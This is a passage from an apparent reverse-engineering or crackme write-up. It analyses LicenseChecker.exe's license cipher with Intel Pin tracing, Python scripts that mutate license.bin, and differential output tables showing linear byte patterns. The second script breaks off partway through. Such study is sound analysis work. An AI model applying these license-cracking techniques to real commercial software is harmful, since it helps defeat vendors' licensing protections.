class="line">[block3 byte4 pos28] 39-&gt;3a A=0xecb4514916d3bc57 B=0xecbb527a10d3bc57 changed_le_idx=[3, 4, 5, 6]</span><br><span class="line">[block3 byte5 pos29] 30-&gt;31 A=0xecb4514916d3bc57 B=0xe9b5404916d3bc55 changed_le_idx=[0, 5, 6, 7]</span><br><span class="line">[block3 byte6 pos30] 31-&gt;32 A=0xecb4514916d3bc57 B=0xef87514616d3ba57 changed_le_idx=[1, 4, 6, 7]</span><br><span class="line">[block3 byte7 pos31] 32-&gt;33 A=0xecb4514916d3bc57 B=0xfdb4544816d1bc57 changed_le_idx=[2, 4, 5, 7]</span><br></pre></td></tr></table></figure>

<p>shows that the round function for each qword is the same. Each byte will contribute to 4 bytes in the cipher.</p>
<p>Then try to use 4 same int 64, output shows that all values are indeed the same. Note that when input[0] is <code>01*8</code>, the Res0 will be shr 3 times, while others will not, this means the program compares the result bit by bit.</p>
<p>Next, try to find the pattern:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">PIN_EXE   = <span class="string">r&quot;pin&quot;</span></span><br><span class="line">TOOL_DLL  = <span class="string">r&quot;Trace.dll&quot;</span></span><br><span class="line">APP_EXE   = <span class="string">r&quot;LicenseChecker.exe&quot;</span></span><br><span class="line">WORKDIR = os.getcwd()</span><br><span class="line">LICENSE_BIN = os.path.join(WORKDIR, <span class="string">&quot;license.bin&quot;</span>)</span><br><span class="line">LOG_PATH = os.path.join(WORKDIR, <span class="string">&quot;log.txt&quot;</span>)</span><br><span class="line">OUT_PATH = os.path.join(WORKDIR, <span class="string">&quot;findpatterns_idx.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">K = <span class="number">1</span></span><br><span class="line">N = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">INBYTE_TO_OUTIDX = &#123;</span><br><span class="line">    <span class="number">0</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">1</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    <span class="number">2</span>: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>],</span><br><span class="line">    <span class="number">3</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>],</span><br><span class="line">    <span class="number">4</span>: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">    <span class="number">5</span>: [<span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">6</span>: [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">7</span>: [<span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RE_REGQ = re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(?:rax|rcx)\s*=\s*0x([0-9a-fA-F]&#123;15,16&#125;)\b&quot;</span>)</span><br><span class="line">RE_MARK = re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(?:rax|rcx)\s*=\s*0xffffffffffffffff\b&quot;</span>, re.I)</span><br><span class="line">KEY_BLACKLIST = &#123;<span class="number">0xEFB1957A03BAECF7</span>, <span class="number">0x8C982983781BCDB6</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_license</span>(<span class="params">k0: <span class="built_in">int</span>, val: <span class="built_in">int</span></span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>([<span class="number">0x01</span>] * <span class="number">8</span> + [<span class="number">0xFF</span>] * <span class="number">24</span>)</span><br><span class="line">    b[k0] = val</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(LICENSE_BIN, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f: f.write(b)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pin</span>():</span><br><span class="line">    cmd = [PIN_EXE, <span class="string">&quot;-t&quot;</span>, TOOL_DLL, <span class="string">&quot;-o&quot;</span>, LOG_PATH, <span class="string">&quot;--&quot;</span>, APP_EXE]</span><br><span class="line">    subprocess.run(cmd, cwd=WORKDIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">le_bytes</span>(<span class="params">qword: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> qword.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plaintext_qwords_from_license</span>(<span class="params">lic: <span class="built_in">bytes</span></span>):</span><br><span class="line">    s = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>): s.add(<span class="built_in">int</span>.from_bytes(lic[off:off+<span class="number">8</span>], <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_candidate</span>(<span class="params">v: <span class="built_in">int</span>, plain_qwords: <span class="built_in">set</span></span>):</span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">in</span> KEY_BLACKLIST: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">in</span> plain_qwords: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="number">0xFFFFFFFF</span>) == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_qword_from_log</span>(<span class="params">log_path: <span class="built_in">str</span>, plain_qwords: <span class="built_in">set</span></span>):</span><br><span class="line">    p = Path(log_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.exists(): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    lines = p.read_text(errors=<span class="string">&quot;ignore&quot;</span>).splitlines()</span><br><span class="line">    last = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">        m = RE_REGQ.search(line)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            v = <span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> is_candidate(v, plain_qwords): last = (v, i, line)</span><br><span class="line">        <span class="keyword">if</span> RE_MARK.search(line):</span><br><span class="line">            <span class="keyword">if</span> last <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="keyword">return</span> last</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= K &lt;= <span class="number">8</span></span><br><span class="line">    k0 = K - <span class="number">1</span></span><br><span class="line">    outidx = INBYTE_TO_OUTIDX[k0]</span><br><span class="line">    base_lic = write_license(k0, <span class="number">0x01</span>)</span><br><span class="line">    run_pin()</span><br><span class="line">    base_plain = plaintext_qwords_from_license(base_lic)</span><br><span class="line">    base = extract_qword_from_log(LOG_PATH, base_plain)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> base: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;baseline log parse failed (no candidate before first FF-marker)&quot;</span>)</span><br><span class="line">    base_q, base_line, base_text = base</span><br><span class="line">    base_le = le_bytes(base_q)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUT_PATH, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;Base license = 8*01 + 24*FF, mutate k=<span class="subst">&#123;K&#125;</span> (0-based <span class="subst">&#123;k0&#125;</span>), outidx=<span class="subst">&#123;outidx&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;Baseline qword = 0x<span class="subst">&#123;base_q:016X&#125;</span> (line <span class="subst">&#123;base_line&#125;</span>) from: <span class="subst">&#123;base_text&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;Baseline LE bytes = <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> base_le)&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;val  qword(HEX)                 picked_LE_bytes_at_outidx   changed_outidx\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;-&quot;</span> * <span class="number">90</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        max_delta = <span class="built_in">min</span>(N, <span class="number">0xFE</span>)</span><br><span class="line">        <span class="keyword">for</span> delta <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_delta + <span class="number">1</span>):</span><br><span class="line">            val = <span class="number">0x01</span> + delta</span><br><span class="line">            <span class="keyword">if</span> val == <span class="number">0x00</span>: <span class="keyword">continue</span></span><br><span class="line">            lic = write_license(k0, val)</span><br><span class="line">            run_pin()</span><br><span class="line">            plain = plaintext_qwords_from_license(lic)</span><br><span class="line">            got = extract_qword_from_log(LOG_PATH, plain)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> got:</span><br><span class="line">                f.write(<span class="string">f&quot;<span class="subst">&#123;val:02X&#125;</span>  &lt;parse failed&gt;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            q, ln, txt = got</span><br><span class="line">            le = le_bytes(q)</span><br><span class="line">            picked = [le[i] <span class="keyword">for</span> i <span class="keyword">in</span> outidx]</span><br><span class="line">            base_picked = [base_le[i] <span class="keyword">for</span> i <span class="keyword">in</span> outidx]</span><br><span class="line">            changed = [outidx[t] <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outidx)) <span class="keyword">if</span> picked[t] != base_picked[t]]</span><br><span class="line">            f.write(</span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;val:02X&#125;</span>  0x<span class="subst">&#123;q:016X&#125;</span>   &quot;</span></span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> picked)&#125;</span>   &quot;</span></span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;changed&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Wrote: <span class="subst">&#123;OUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">01  0x411CD85F280546A1   a1 46 05 41   []</span><br><span class="line">02  0x471CD85F280A4591   91 45 0a 47   [0, 1, 2, 7]</span><br><span class="line">03  0x451CD85F280F4481   81 44 0f 45   [0, 1, 2, 7]</span><br><span class="line">04  0x4B1CD85F281443F1   f1 43 14 4b   [0, 1, 2, 7]</span><br><span class="line">05  0x491CD85F281142E1   e1 42 11 49   [0, 1, 2, 7]</span><br><span class="line">06  0x4F1CD85F281E41D1   d1 41 1e 4f   [0, 1, 2, 7]</span><br><span class="line">07  0x4D1CD85F281B40C1   c1 40 1b 4d   [0, 1, 2, 7]</span><br><span class="line">08  0x531CD85F28284F31   31 4f 28 53   [0, 1, 2, 7]</span><br><span class="line">09  0x511CD85F282D4E21   21 4e 2d 51   [0, 1, 2, 7]</span><br><span class="line">0A  0x571CD85F28224D11   11 4d 22 57   [0, 1, 2, 7]</span><br><span class="line">0B  0x551CD85F28274C01   01 4c 27 55   [0, 1, 2, 7]</span><br><span class="line">0C  0x5B1CD85F283C4B71   71 4b 3c 5b   [0, 1, 2, 7]</span><br><span class="line">0D  0x591CD85F28394A61   61 4a 39 59   [0, 1, 2, 7]</span><br><span class="line">0E  0x5F1CD85F28364951   51 49 36 5f   [0, 1, 2, 7]</span><br><span class="line">0F  0x5D1CD85F28334841   41 48 33 5d   [0, 1, 2, 7]</span><br><span class="line">10  0x631CD85F285056B1   b1 56 50 63   [0, 1, 2, 7]</span><br><span class="line">11  0x611CD85F285557A1   a1 57 55 61   [1, 2, 7]</span><br></pre></td></tr></table></figure>

<p>We can see strong linear patterns in the cipher’s 4 bytes. Use bit-change to xor the delta and build the equation:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">PIN_EXE   = <span class="string">r&quot;pin&quot;</span></span><br><span class="line">TOOL_DLL  = <span class="string">r&quot;Trace.dll&quot;</span></span><br><span class="line">APP_EXE   = <span class="string">r&quot;LicenseChecker.exe&quot;</span></span><br><span class="line">WORKDIR = os.getcwd()</span><br><span class="line">LICENSE_BIN = os.path.join(WORKDIR, <span class="string">&quot;license.bin&quot;</span>)</span><br><span class="line">LOG_PATH = os.path.join(WORKDIR, <span class="string">&quot;log.txt&quot;</span>)</span><br><span class="line">OUT_PATH = os.path.join(WORKDIR, <span class="string">&quot;findpatterns_idx.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">BASE_HEAD_BYTE = <span class="number">0x11</span></span><br><span class="line">TAIL_BYTE      = <span class="number">0xFF</span></span><br><span class="line">HEAD_LEN       = <span class="number">8</span></span><br><span class="line">TAIL_LEN       = <span class="number">24</span></span><br><span class="line">MARKER_N = <span class="number">0</span></span><br><span class="line">DEBUG_EACH_RUN = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">INBYTE_TO_OUTIDX = &#123;</span><br><span class="line">    <span class="number">0</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">1</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    <span class="number">2</span>: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>],</span><br><span class="line">    <span class="number">3</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>],</span><br><span class="line">    <span class="number">4</span>: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">    <span class="number">5</span>: [<span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">6</span>: [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">    <span class="number">7</span>: [<span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RE_REGQ = re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(rax|rcx)\s*=\s*0x([0-9a-fA-F]&#123;15,16&#125;)\b&quot;</span>)</span><br><span class="line">KEY_BLACKLIST = &#123;<span class="number">0xEFB1957A03BAECF7</span>, <span class="number">0x8C982983781BCDB6</span>&#125;</span><br><span class="line">MARK_STR = <span class="string">&quot;0xffffffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pin</span>():</span><br><span class="line">    cmd = [PIN_EXE, <span class="string">&quot;-t&quot;</span>, TOOL_DLL, <span class="string">&quot;-o&quot;</span>, LOG_PATH, <span class="string">&quot;--&quot;</span>, APP_EXE]</span><br><span class="line">    subprocess.run(cmd, cwd=WORKDIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">le_bytes</span>(<span class="params">qword: <span class="built_in">int</span></span>): <span class="keyword">return</span> qword.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_hex_bytes</span>(<span class="params">bb: <span class="built_in">bytes</span></span>): <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> bb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plaintext_qwords_from_license</span>(<span class="params">lic: <span class="built_in">bytes</span></span>):</span><br><span class="line">    s = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>): s.add(<span class="built_in">int</span>.from_bytes(lic[off:off+<span class="number">8</span>], <span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_candidate</span>(<span class="params">v: <span class="built_in">int</span>, plain_qwords: <span class="built_in">set</span></span>):</span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">in</span> KEY_BLACKLIST: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">in</span> plain_qwords:  <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (v &amp; <span class="number">0xFFFFFFFF</span>) == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_license_from_head</span>(<span class="params">head8: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(head8) == HEAD_LEN</span><br><span class="line">    lic = <span class="built_in">bytearray</span>(head8 + <span class="built_in">bytes</span>([TAIL_BYTE]) * TAIL_LEN)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> lic: <span class="keyword">raise</span> ValueError(<span class="string">&quot;license contains 0x00 -&gt; would be truncated by strlen&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(LICENSE_BIN, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f: f.write(lic)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(lic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_qword_from_log</span>(<span class="params">log_path: <span class="built_in">str</span>, plain_qwords: <span class="built_in">set</span>, marker_n: <span class="built_in">int</span>, dbg_tag: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    p = Path(log_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.exists(): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    lines = p.read_text(errors=<span class="string">&quot;ignore&quot;</span>).splitlines()</span><br><span class="line">    last = <span class="literal">None</span></span><br><span class="line">    marker_cnt = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">        m = RE_REGQ.search(line)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            reg = m.group(<span class="number">1</span>).lower()</span><br><span class="line">            v = <span class="built_in">int</span>(m.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> is_candidate(v, plain_qwords): last = (v, i, reg, line)</span><br><span class="line">        <span class="keyword">if</span> MARK_STR <span class="keyword">in</span> line.lower():</span><br><span class="line">            marker_cnt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> marker_cnt == marker_n:</span><br><span class="line">                <span class="keyword">if</span> DEBUG_EACH_RUN:</span><br><span class="line">                    <span class="keyword">if</span> last:</span><br><span class="line">                        v, li, reg, ltxt = last</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[dbg:<span class="subst">&#123;dbg_tag&#125;</span>] hit marker#<span class="subst">&#123;marker_cnt&#125;</span> at L<span class="subst">&#123;i&#125;</span>, pick L<span class="subst">&#123;li&#125;</span> <span class="subst">&#123;reg&#125;</span>=0x<span class="subst">&#123;v:016X&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">f&quot;[dbg:<span class="subst">&#123;dbg_tag&#125;</span>] hit marker#<span class="subst">&#123;marker_cnt&#125;</span> at L<span class="subst">&#123;i&#125;</span>, but no candidate before it&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> (last, i, line)</span><br><span class="line">    <span class="keyword">if</span> DEBUG_EACH_RUN: <span class="built_in">print</span>(<span class="string">f&quot;[dbg:<span class="subst">&#123;dbg_tag&#125;</span>] no marker#<span class="subst">&#123;marker_n&#125;</span> found, markers_seen=<span class="subst">&#123;marker_cnt+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    base_head = <span class="built_in">bytes</span>([BASE_HEAD_BYTE] * HEAD_LEN)</span><br><span class="line">    base_lic = write_license_from_head(base_head)</span><br><span class="line">    run_pin()</span><br><span class="line">    base_plain = plaintext_qwords_from_license(base_lic)</span><br><span class="line">    base_ret = extract_qword_from_log(LOG_PATH, base_plain, MARKER_N, dbg_tag=<span class="string">&quot;base&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> base_ret <span class="keyword">or</span> <span class="keyword">not</span> base_ret[<span class="number">0</span>]: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;baseline log parse failed (no candidate before selected marker)&quot;</span>)</span><br><span class="line">    (base_pick, base_marker_line, base_marker_text) = base_ret</span><br><span class="line">    base_q, base_line, base_reg, base_text = base_pick</span><br><span class="line">    base_le = le_bytes(base_q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUT_PATH, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        